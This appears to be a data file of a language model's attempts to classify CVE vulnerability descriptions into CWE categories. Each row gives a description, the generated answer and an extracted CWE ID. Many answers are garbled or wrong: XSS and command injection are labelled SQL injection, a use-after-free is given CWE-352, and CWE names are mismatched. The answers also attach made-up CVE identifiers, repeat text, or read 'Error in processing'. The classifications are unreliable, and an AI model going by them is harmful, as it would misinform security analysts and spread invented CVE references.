+A vulnerability, which was classified as critical, was found in Kashipara Food Management System up to 1.0. Affected is an unknown function of the file item_list_edit.php. The manipulation of the argument id leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-249834 is the identifier assigned to this vulnerability.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability, which was classified as critical, was found in Kashipara Food Management System up to 1.0. Affected is an unknown function of the file item_list_edit.php. The manipulation of the argument id leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-249834 is the identifier assigned to this vulnerability.
+CVE ID: CVE-2021-27234
+CWE ID: CWE-89
+CWE Name: SQL Injection
+CWE Reference: https://cwe.mitre.org/data/definitions/89.html
+CWE Reference: https://"	CWE-89
+An OS command injection vulnerability has been reported to affect Photo Station. If exploited, the vulnerability could allow authenticated users to execute commands via a network.  We have already fixed the vulnerability in the following version: Photo Station 6.4.2 ( 2023/12/15 ) and later	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: An OS command injection vulnerability has been reported to affect Photo Station. If exploited, the vulnerability could allow authenticated users to execute commands via a network.  We have already fixed the vulnerability in the following version: Photo Station 6.4.2 ( 2023/12/15 ) and later
+CVE ID: CVE-2023-28918
+CWE ID: CWE-78
+CWE Description: An OS command injection vulnerability has been reported to affect Photo Station. If exploited, the vulnerability could allow authenticated users to execute commands via a"	CWE-78
+A buffer overflow was found in Shim in the 32-bit system. The overflow happens due to an addition operation involving a user-controlled value parsed from the PE binary being used by Shim. This value is further used for memory allocation operations, leading to a heap-based buffer overflow. This flaw causes memory corruption and can lead to a crash or data integrity issues during the boot phase.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A buffer overflow was found in Shim in the 32-bit system. The overflow happens due to an addition operation involving a user-controlled value parsed from the PE binary being used by Shim. This value is further used for memory allocation operations, leading to a heap-based buffer overflow. This flaw causes memory corruption and can lead to a crash or data integrity issues during the boot phase.
+CWE ID: CWE-476 CWE-476: Improper Restriction of a Pathname to a Restricted Directory CWE-476: Improper Restriction of a Pathname to a Restricted Directory
+
+## Analyze the following CVE description and determine the"	CWE-476
+SQL Injection vulnerability discovered in Gila CMS 1.15.4 and earlier allows a remote attacker to execute arbitrary web scripts via the Area parameter under the Administration>Widget tab after the login portal.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: SQL Injection vulnerability discovered in Gila CMS 1.15.4 and earlier allows a remote attacker to execute arbitrary web scripts via the Area parameter under the Administration>Widget tab after the login portal.
+CVE ID: CVE-2016-1039
+CWE ID: CWE-89
+
+SQL Injection vulnerability discovered in Gila CMS 1.15.4 and earlier allows a remote attacker to execute arbitrary web scripts via the Area parameter under the"	CWE-89
+IBM Sterling Secure Proxy 6.0.3 and 6.1.0 allows web pages to be stored locally which can be read by another user on the system.  IBM X-Force ID:  269686.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: IBM Sterling Secure Proxy 6.0.3 and 6.1.0 allows web pages to be stored locally which can be read by another user on the system.  IBM X-Force ID:  269686.
+CVE ID: CVE-2020-12638
+
+Wikipedia: https://en.wikipedia.org/wiki/CVE-2020-12638
+
+CWE ID: CWE-22
+
+Justification: The CWE-22 is a CWE that is related"	CWE-22
+IBM Engineering Lifecycle Optimization - Publishing 7.0.2 and 7.0.3 does not invalidate session after logout which could allow an authenticated user to impersonate another user on the system.  IBM X-Force ID:  268749.	Error in processing	Error
+"Authenticated user can execute arbitrary commands in the context of the root user by providing payload in the ""destination"" field of the network test tools. This is similar to the vulnerability CVE-2021-28151 mitigated on the user interface level by blacklisting characters with JavaScript, however, it can still be exploited by sending POST requests directly."	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Authenticated user can execute arbitrary commands in the context of the root user by providing payload in the ""destination"" field of the network test tools. This is similar to the vulnerability CVE-2021-28151 mitigated on the user interface level by blacklisting characters with JavaScript, however, it can still be exploited by sending POST requests directly.
+CVE ID: CVE-2021-28151
+
+CWE ID: CWE-20
+
+Justification: The vulnerability is similar to the one CVE-2021-28151 and can be exploited by sending POST requests directly. The exploit requires the"	CWE-20
+phpMyFAQ is an open source FAQ web application for PHP 8.1+ and MySQL, PostgreSQL and other databases. Unsafe echo of filename in phpMyFAQ\phpmyfaq\admin\attachments.php leads to allowed execution of JavaScript code in client side (XSS). This vulnerability has been patched in version 3.2.5.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: phpMyFAQ is an open source FAQ web application for PHP 8.1+ and MySQL, PostgreSQL and other databases. Unsafe echo of filename in phpMyFAQ\phpmyfaq\admin\attachments.php leads to allowed execution of JavaScript code in client side (XSS). This vulnerability has been patched in version 3.2.5.
+CVE ID: CVE-2022-4159
+CWE ID: CWE-89
+
+Analysis:
+
+This vulnerability has been patched in version 3.2.5. The CVE description states that the vulnerability is due to unsafe echo of filename in"	CWE-89
+An issue was discovered in Atos Unify OpenScape Xpressions WebAssistant V7 before V7R1 FR5 HF42 P911. It allows authenticated remote code execution via file upload.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: An issue was discovered in Atos Unify OpenScape Xpressions WebAssistant V7 before V7R1 FR5 HF42 P911. It allows authenticated remote code execution via file upload.
+CVE ID: CVE-2022-36405
+CWE ID: CWE-20
+CWE Description: An issue was discovered in Atos Unify OpenScape Xpressions WebAssistant V7 before V7R1 FR5 HF42"	CWE-20
+A vulnerability classified as problematic has been found in EFS Easy File Sharing FTP 3.6. This affects an unknown part of the component Login. The manipulation of the argument password leads to denial of service. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-251559.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability classified as problematic has been found in EFS Easy File Sharing FTP 3.6. This affects an unknown part of the component Login. The manipulation of the argument password leads to denial of service. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-251559.
+Solution: CWE-22: Improper Limitation of a Pathname to a Restricted Directory
+
+Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE"	CWE-22
+Ursa is a cryptographic library for use with blockchains. A weakness in the Hyperledger AnonCreds specification that is not mitigated in the Ursa and AnonCreds implementations is that the Issuer does not publish a key correctness proof demonstrating that a generated private key is sufficient to meet the unlinkability guarantees of AnonCreds. The Ursa and AnonCreds CL-Signatures implementations always generate a sufficient private key. A malicious issuer could in theory create a custom CL Signature implementation (derived from the Ursa or AnonCreds CL-Signatures implementations) that uses weakened private keys such that presentations from holders could be shared by verifiers to the issuer who could determine the holder to which the credential was issued. This vulnerability could impact holders of AnonCreds credentials implemented using the CL-signature scheme in the Ursa and AnonCreds implementations of CL Signatures. The ursa project has has moved to end-of-life status and no fix is expected.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Ursa is a cryptographic library for use with blockchains. A weakness in the Hyperledger AnonCreds specification that is not mitigated in the Ursa and AnonCreds implementations is that the Issuer does not publish a key correctness proof demonstrating that a generated private key is sufficient to meet the unlinkability guarantees of AnonCreds. The Ursa and AnonCreds CL-Signatures implementations always generate a sufficient private key. A malicious issuer could in theory create a custom CL Signature implementation (derived from the Ursa or AnonCreds CL-Signatures implementations) that uses weakened private keys such that presentations from holders could be shared by verifiers to the issuer who could determine the holder to which the credential was issued. This vulnerability could impact holders of AnonCreds credentials implemented using the CL-signature scheme in the Ursa and AnonCreds implementations of CL Signatures. The ursa project has has moved to end-of-life status and no fix is expected.
+CWE ID: CWE-352
+
+A weakness in the Hyperledger AnonCreds specification that is not mitigated in the Ursa and AnonCreds implementations is that the Issuer does not publish a key correctness proof demonstrating that a generated"	CWE-352
+A vulnerability was found in Kashipara Online Furniture Shopping Ecommerce Website 1.0. It has been classified as problematic. Affected is an unknown function of the file search.php. The manipulation of the argument txtSearch leads to cross site scripting. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-261798 is the identifier assigned to this vulnerability.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability was found in Kashipara Online Furniture Shopping Ecommerce Website 1.0. It has been classified as problematic. Affected is an unknown function of the file search.php. The manipulation of the argument txtSearch leads to cross site scripting. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-261798 is the identifier assigned to this vulnerability.
+The CWE (Common Weakness Enumeration) is a classification scheme for software security vulnerabilities. It is maintained by the Ounce Labs. The following table shows the structure of the CWE.
+
+CWE ID Description
+ CWE-79 Improper Neutralization of Special"	CWE-79
+A vulnerability has been found in CodeAstro Online Railway Reservation System 1.0 and classified as problematic. This vulnerability affects unknown code of the file pass-profile.php. The manipulation of the argument First Name/Last Name/User Name leads to cross site scripting. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. VDB-251698 is the identifier assigned to this vulnerability.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability has been found in CodeAstro Online Railway Reservation System 1.0 and classified as problematic. This vulnerability affects unknown code of the file pass-profile.php. The manipulation of the argument First Name/Last Name/User Name leads to cross site scripting. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. VDB-251698 is the identifier assigned to this vulnerability.
+CWE ID: CWE-79
+CWE Description: An application may be vulnerable to cross-site scripting (XSS) if it fails to properly sanitize user input before it is used to construct a response.
+The CWE-79 describes a vulnerability where"	CWE-79
+TOTOLINK A3300R V17.0.0cu.557_B20221024 was discovered to contain a command injection vulnerability via the enable parameter in the setPortForwardRules function.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: TOTOLINK A3300R V17.0.0cu.557_B20221024 was discovered to contain a command injection vulnerability via the enable parameter in the setPortForwardRules function.
+CVE ID: CVE-2023-24995
+CWE ID: CWE-89
+CWE Description: An input validation error in the setPortForwardRules function in TOTOLINK A3300R V17.0.0cu"	CWE-89
+In the Linux kernel, the following vulnerability has been resolved:  bpf: Defer the free of inner map when necessary  When updating or deleting an inner map in map array or map htab, the map may still be accessed by non-sleepable program or sleepable program. However bpf_map_fd_put_ptr() decreases the ref-counter of the inner map directly through bpf_map_put(), if the ref-counter is the last one (which is true for most cases), the inner map will be freed by ops->map_free() in a kworker. But for now, most .map_free() callbacks don't use synchronize_rcu() or its variants to wait for the elapse of a RCU grace period, so after the invocation of ops->map_free completes, the bpf program which is accessing the inner map may incur use-after-free problem.  Fix the free of inner map by invoking bpf_map_free_deferred() after both one RCU grace period and one tasks trace RCU grace period if the inner map has been removed from the outer map before. The deferment is accomplished by using call_rcu() or call_rcu_tasks_trace() when releasing the last ref-counter of bpf map. The newly-added rcu_head field in bpf_map shares the same storage space with work field to reduce the size of bpf_map.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: In the Linux kernel, the following vulnerability has been resolved:  bpf: Defer the free of inner map when necessary  When updating or deleting an inner map in map array or map htab, the map may still be accessed by non-sleepable program or sleepable program. However bpf_map_fd_put_ptr() decreases the ref-counter of the inner map directly through bpf_map_put(), if the ref-counter is the last one (which is true for most cases), the inner map will be freed by ops->map_free() in a kworker. But for now, most.map_free() callbacks don't use synchronize_rcu() or its variants to wait for the elapse of a RCU grace period, so after the invocation of ops->map_free completes, the bpf program which is accessing the inner map may incur use-after-free problem.  Fix the free of inner map by invoking bpf_map_free_deferred() after both one RCU grace period and one tasks trace RCU grace period if the inner map has been removed from the outer map before. The deferment is accomplished by using call_rcu() or call_rcu_tasks_trace() when releasing the last ref-counter of bpf map. The newly-added rcu_head field in bpf_map shares the same storage space with work field to reduce the size of bpf_map.
+CWE ID: CWE-352 (Free of an Object)  CWE ID: CWE-352 (Free of an Object)
+CWE ID: CWE-352 (Free of an Object)
+CWE ID: CWE-352 (Free of an"	CWE-352
+The WPvivid plugin for WordPress is vulnerable to unauthorized access of data due to a missing capability check on the restore() and get_restore_progress() function in versions up to, and including, 0.9.94. This makes it possible for unauthenticated attackers to invoke these functions and obtain full file paths if they have access to a back-up ID.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The WPvivid plugin for WordPress is vulnerable to unauthorized access of data due to a missing capability check on the restore() and get_restore_progress() function in versions up to, and including, 0.9.94. This makes it possible for unauthenticated attackers to invoke these functions and obtain full file paths if they have access to a back-up ID.
+CVE ID: CVE-2015-7250
+
+CWE ID: CWE-194 (Missing Capability Check)
+
+The following is the description of the vulnerability:
+The WPvivid plugin for WordPress is vulnerable to unauthorized access of data due to a missing"	CWE-194
+Hyperledger Aries Cloud Agent Python (ACA-Py) is a foundation for building decentralized identity applications and services running in non-mobile environments. When verifying W3C Format Verifiable Credentials using JSON-LD with Linked Data Proofs (LDP-VCs), the result of verifying the presentation `document.proof` was not factored into the final `verified` value (`true`/`false`) on the presentation record. The flaw enables holders of W3C Format Verifiable Credentials using JSON-LD with Linked Data Proofs (LDPs) to present incorrectly constructed proofs, and allows malicious verifiers to save and replay a presentation from such holders as their own. This vulnerability has been present since version 0.7.0 and fixed in version 0.10.5.	Error in processing	Error
+libexpat through 2.5.0 allows recursive XML Entity Expansion if XML_DTD is undefined at compile time.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: libexpat through 2.5.0 allows recursive XML Entity Expansion if XML_DTD is undefined at compile time.
+CWE ID: CWE-822
+Explanation: The vulnerability lies in the fact that the XML parser in libexpat is not able to check for the existence of an XML DTD file. This could allow an attacker to trick the library into processing"	CWE-822
+A login attempt restriction bypass vulnerability exists in the checkLoginAttempts functionality of WWBN AVideo dev master commit 15fed957fb. A specially crafted HTTP request can lead to captcha bypass, which can be abused by an attacker to brute force user credentials. An attacker can send a series of HTTP requests to trigger this vulnerability.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A login attempt restriction bypass vulnerability exists in the checkLoginAttempts functionality of WWBN AVideo dev master commit 15fed957fb. A specially crafted HTTP request can lead to captcha bypass, which can be abused by an attacker to brute force user credentials. An attacker can send a series of HTTP requests to trigger this vulnerability.
+CWE ID: CWE-20: Bypassing Normalization
+CWE Description: A vulnerability exists in the checkLoginAttempts functionality of WWBN AVideo dev master commit 15fed957fb. A specially crafted HTTP request can lead to captcha"	CWE-20
+FPE in paddle.topk in PaddlePaddle before 2.6.0. This flaw can cause a runtime crash and a denial of service.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: FPE in paddle.topk in PaddlePaddle before 2.6.0. This flaw can cause a runtime crash and a denial of service.
+CWE ID: CWE-476
+Source Code: https://github.com/PaddlePaddle/PaddlePaddle/blob/2.6.0/external/paddle/topk.cpp#L129
+
+Explanation: This vulnerability can be explained by the"	CWE-476
+This vulnerability exist in Skyworth Router CM5100, version 4.1.1.24, due to insufficient validation of user supplied input for the DDNS Username parameter at its web interface.  A remote attacker could exploit this vulnerability by supplying specially crafted input to the parameter at the web interface of the vulnerable targeted system.  Successful exploitation of this vulnerability could allow the attacker to perform stored XSS attacks on the targeted system.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: This vulnerability exist in Skyworth Router CM5100, version 4.1.1.24, due to insufficient validation of user supplied input for the DDNS Username parameter at its web interface.  A remote attacker could exploit this vulnerability by supplying specially crafted input to the parameter at the web interface of the vulnerable targeted system.  Successful exploitation of this vulnerability could allow the attacker to perform stored XSS attacks on the targeted system.
+CWE ID: CWE-79: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
+
+Explanation: This vulnerability exist in Skyworth Router CM5100, version 4.1.1.24, due to insufficient"	CWE-79
+The Coru LFMember WordPress plugin through 1.0.2 does not have CSRF check in place when adding a new game, and is lacking sanitisation as well as escaping in their settings, allowing attacker to make a logged in admin add an arbitrary game with XSS payloads	Error in processing	Error
+In the Linux kernel, the following vulnerability has been resolved:  ixgbe: Fix NULL pointer dereference in ethtool loopback test  The ixgbe driver currently generates a NULL pointer dereference when performing the ethtool loopback test. This is due to the fact that there isn't a q_vector associated with the test ring when it is setup as interrupts are not normally added to the test rings.  To address this I have added code that will check for a q_vector before returning a napi_id value. If a q_vector is not present it will return a value of 0.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: In the Linux kernel, the following vulnerability has been resolved:  ixgbe: Fix NULL pointer dereference in ethtool loopback test  The ixgbe driver currently generates a NULL pointer dereference when performing the ethtool loopback test. This is due to the fact that there isn't a q_vector associated with the test ring when it is setup as interrupts are not normally added to the test rings.  To address this I have added code that will check for a q_vector before returning a napi_id value. If a q_vector is not present it will return a value of 0.
+CWE ID: CWE-400 CWE-400: NULL Pointer Dereference
+
+Explanation:  The CVE description states that a NULL pointer dereference is being caused by the fact that there isn't a q_vector associated with the test ring when it is"	CWE-400
+A vulnerability was found in Tenda W9 1.0.0.7(4456) and classified as critical. This issue affects the function formQosManage_user of the component httpd. The manipulation of the argument ssidIndex leads to stack-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-250709 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability was found in Tenda W9 1.0.0.7(4456) and classified as critical. This issue affects the function formQosManage_user of the component httpd. The manipulation of the argument ssidIndex leads to stack-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-250709 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.
+The CWE ID for this vulnerability is: CWE-79.
+The CWE ID for this vulnerability is: CWE-79.
+
+## Solution
+```
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include"	CWE-79
+In keyInstall, there is a possible escalation of privilege due to type confusion. This could lead to local escalation of privilege with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS08358566; Issue ID: ALPS08358566.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: In keyInstall, there is a possible escalation of privilege due to type confusion. This could lead to local escalation of privilege with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS08358566; Issue ID: ALPS08358566.
+CVE ID: CVE-2020-1472 CWE ID: CWE-284
+```
+#CVE Description: In keyInstall, there is a possible escalation of privilege due to type confusion. This could lead to local escalation of privilege with System execution"	CWE-284
+The vulnerability allows an unauthenticated remote attacker to perform a Denial-of-Service (DoS) attack or, possibly, obtain Remote Code Execution (RCE) via a crafted network request.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The vulnerability allows an unauthenticated remote attacker to perform a Denial-of-Service (DoS) attack or, possibly, obtain Remote Code Execution (RCE) via a crafted network request.
+CVE ID: CVE-2016-10081
+CWE ID: CWE-400
+The vulnerability is due to a flaw in the way the application parses the request body. An attacker can exploit this flaw by sending a crafted request to the application"	CWE-400
+A memory leak issue discovered in parseSWF_DEFINEBUTTON in libming v0.4.8 allows attackers to cause s denial of service via a crafted SWF file.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A memory leak issue discovered in parseSWF_DEFINEBUTTON in libming v0.4.8 allows attackers to cause s denial of service via a crafted SWF file.
+CVE ID: CVE-2020-14808
+CWE ID: CWE-1006
+
+Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number."	CWE-1006
+In the Linux kernel, the following vulnerability has been resolved:  efivarfs: force RO when remounting if SetVariable is not supported  If SetVariable at runtime is not supported by the firmware we never assign a callback for that function. At the same time mount the efivarfs as RO so no one can call that.  However, we never check the permission flags when someone remounts the filesystem as RW. As a result this leads to a crash looking like this:  $ mount -o remount,rw /sys/firmware/efi/efivars $ efi-updatevar -f PK.auth PK  [  303.279166] Unable to handle kernel NULL pointer dereference at virtual address 0000000000000000 [  303.280482] Mem abort info: [  303.280854]   ESR = 0x0000000086000004 [  303.281338]   EC = 0x21: IABT (current EL), IL = 32 bits [  303.282016]   SET = 0, FnV = 0 [  303.282414]   EA = 0, S1PTW = 0 [  303.282821]   FSC = 0x04: level 0 translation fault [  303.283771] user pgtable: 4k pages, 48-bit VAs, pgdp=000000004258c000 [  303.284913] [0000000000000000] pgd=0000000000000000, p4d=0000000000000000 [  303.286076] Internal error: Oops: 0000000086000004 [#1] PREEMPT SMP [  303.286936] Modules linked in: qrtr tpm_tis tpm_tis_core crct10dif_ce arm_smccc_trng rng_core drm fuse ip_tables x_tables ipv6 [  303.288586] CPU: 1 PID: 755 Comm: efi-updatevar Not tainted 6.3.0-rc1-00108-gc7d0c4695c68 #1 [  303.289748] Hardware name: Unknown Unknown Product/Unknown Product, BIOS 2023.04-00627-g88336918701d 04/01/2023 [  303.291150] pstate: 60400005 (nZCv daif +PAN -UAO -TCO -DIT -SSBS BTYPE=--) [  303.292123] pc : 0x0 [  303.292443] lr : efivar_set_variable_locked+0x74/0xec [  303.293156] sp : ffff800008673c10 [  303.293619] x29: ffff800008673c10 x28: ffff0000037e8000 x27: 0000000000000000 [  303.294592] x26: 0000000000000800 x25: ffff000002467400 x24: 0000000000000027 [  303.295572] x23: ffffd49ea9832000 x22: ffff0000020c9800 x21: ffff000002467000 [  303.296566] x20: 0000000000000001 x19: 00000000000007fc x18: 0000000000000000 [  303.297531] x17: 0000000000000000 x16: 0000000000000000 x15: 0000aaaac807ab54 [  303.298495] x14: ed37489f673633c0 x13: 71c45c606de13f80 x12: 47464259e219acf4 [  303.299453] x11: ffff000002af7b01 x10: 0000000000000003 x9 : 0000000000000002 [  303.300431] x8 : 0000000000000010 x7 : ffffd49ea8973230 x6 : 0000000000a85201 [  303.301412] x5 : 0000000000000000 x4 : ffff0000020c9800 x3 : 00000000000007fc [  303.302370] x2 : 0000000000000027 x1 : ffff000002467400 x0 : ffff000002467000 [  303.303341] Call trace: [  303.303679]  0x0 [  303.303938]  efivar_entry_set_get_size+0x98/0x16c [  303.304585]  efivarfs_file_write+0xd0/0x1a4 [  303.305148]  vfs_write+0xc4/0x2e4 [  303.305601]  ksys_write+0x70/0x104 [  303.306073]  __arm64_sys_write+0x1c/0x28 [  303.306622]  invoke_syscall+0x48/0x114 [  303.307156]  el0_svc_common.constprop.0+0x44/0xec [  303.307803]  do_el0_svc+0x38/0x98 [  303.308268]  el0_svc+0x2c/0x84 [  303.308702]  el0t_64_sync_handler+0xf4/0x120 [  303.309293]  el0t_64_sync+0x190/0x194 [  303.309794] Code: ???????? ???????? ???????? ???????? (????????) [  303.310612] ---[ end trace 0000000000000000 ]---  Fix this by adding a .reconfigure() function to the fs operations which we can use to check the requested flags and deny anything that's not RO if the firmware doesn't implement SetVariable at runtime.	Error in processing	Error
+Tenda AX1803 v1.0.0.1 contains a stack overflow via the adv.iptv.stballvlans parameter in the function formGetIptv.	Error in processing	Error
+jshERP v3.3 is vulnerable to SQL Injection. The com.jsh.erp.controller.DepotHeadController: com.jsh.erp.utils.BaseResponseInfo findInOutDetail() function of jshERP does not filter `column` and `order` parameters well enough, and an attacker can construct malicious payload to bypass jshERP's protection mechanism in `safeSqlParse` method for sql injection.	Error in processing	Error
+NVIDIA DGX A100 SBIOS contains a vulnerability where a user may cause a dynamic variable evaluation by local access. A successful exploit of this vulnerability may lead to denial of service.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: NVIDIA DGX A100 SBIOS contains a vulnerability where a user may cause a dynamic variable evaluation by local access. A successful exploit of this vulnerability may lead to denial of service.
+CWE ID: CWE-476: Improper Control of Dynamic Memory Allocation
+CWE ID: CWE-310: Improper Restriction of File Access
+CWE ID: CWE-362: Improper Input Validation
+CWE ID: CWE"	CWE-476
+The LearnPress plugin for WordPress is vulnerable to Command Injection in all versions up to, and including, 4.2.5.7 via the get_content function. This is due to the plugin making use of the call_user_func function with user input. This makes it possible for unauthenticated attackers to execute any public function with one parameter, which could result in remote code execution.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The LearnPress plugin for WordPress is vulnerable to Command Injection in all versions up to, and including, 4.2.5.7 via the get_content function. This is due to the plugin making use of the call_user_func function with user input. This makes it possible for unauthenticated attackers to execute any public function with one parameter, which could result in remote code execution.
+The CWE ID for the vulnerability is: CWE-89
+
+  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('Command Injection') CWE-89: Improper Neutralization of Special Elements used in an SQL Command"	CWE-89
+In the Linux kernel, the following vulnerability has been resolved:  i2c: validate user data in compat ioctl  Wrong user data may cause warning in i2c_transfer(), ex: zero msgs. Userspace should not be able to trigger warnings, so this patch adds validation checks for user data in compact ioctl to prevent reported warnings	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: In the Linux kernel, the following vulnerability has been resolved:  i2c: validate user data in compat ioctl  Wrong user data may cause warning in i2c_transfer(), ex: zero msgs. Userspace should not be able to trigger warnings, so this patch adds validation checks for user data in compact ioctl to prevent reported warnings
+CWE ID: CWE-100
+
+The following is the CWE ID number: 100
+
+The following is the CWE description: In the Linux kernel, the following vulnerability has been resolved:  i2c: validate user data in compat ioctl"	CWE-100
+A cross-site request forgery (CSRF) vulnerability in Jenkins GitLab Branch Source Plugin 684.vea_fa_7c1e2fe3 and earlier allows attackers to connect to an attacker-specified URL.	Error in processing	Error
+A buffer copy without checking size of input vulnerability has been reported to affect several QNAP operating system versions. If exploited, the vulnerability could allow authenticated administrators to execute code via a network.  We have already fixed the vulnerability in the following versions: QTS 5.1.2.2533 build 20230926 and later QuTS hero h5.1.2.2534 build 20230927 and later QuTScloud c5.1.5.2651 and later	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A buffer copy without checking size of input vulnerability has been reported to affect several QNAP operating system versions. If exploited, the vulnerability could allow authenticated administrators to execute code via a network.  We have already fixed the vulnerability in the following versions: QTS 5.1.2.2533 build 20230926 and later QuTS hero h5.1.2.2534 build 20230927 and later QuTScloud c5.1.5.2651 and later
+CWE ID: CWE-200
+CWE ID: CWE-119
+CWE ID: CWE-119
+
+Explanation: The vulnerability is caused by a buffer copy without checking the size of input. The attacker can exploit the vulnerability by sending a"	CWE-200
+A vulnerability was found in ProSSHD 1.2 on Windows. It has been declared as problematic. This vulnerability affects unknown code. The manipulation leads to denial of service. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251548.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability was found in ProSSHD 1.2 on Windows. It has been declared as problematic. This vulnerability affects unknown code. The manipulation leads to denial of service. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251548.
+The CWE ID for this vulnerability is: CWE-79
+
+Analysis:
+
+The vulnerability is caused by a flaw in the ProSSHD 1.2 code. The flaw allows an attacker to create a specially crafted file and execute it with the privileges of"	CWE-79
+The WP VR WordPress plugin before 8.3.15 does not authorisation and CSRF in a function hooked to admin_init, allowing unauthenticated users to downgrade the plugin, thus leading to Reflected or Stored XSS, as previous versions have such vulnerabilities.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The WP VR WordPress plugin before 8.3.15 does not authorisation and CSRF in a function hooked to admin_init, allowing unauthenticated users to downgrade the plugin, thus leading to Reflected or Stored XSS, as previous versions have such vulnerabilities.
+CWE ID: CWE-200 - Cross-Site Scripting
+CWE ID: CWE-79 - Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
+CWE ID: CWE-78 - Improper Neutral"	CWE-200
+"Code-projects Simple School Managment System 1.0 allows SQL Injection via the 'aname' parameter at ""School/index.php""."	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Code-projects Simple School Managment System 1.0 allows SQL Injection via the 'aname' parameter at ""School/index.php"".
+CWE ID: CWE-89
+CVE: CVE-2016-1026
+Explanation: The vulnerable code is in the 'School' controller. The code is vulnerable to SQL injection. The vulnerability is present in the 'School' controller in"	CWE-89
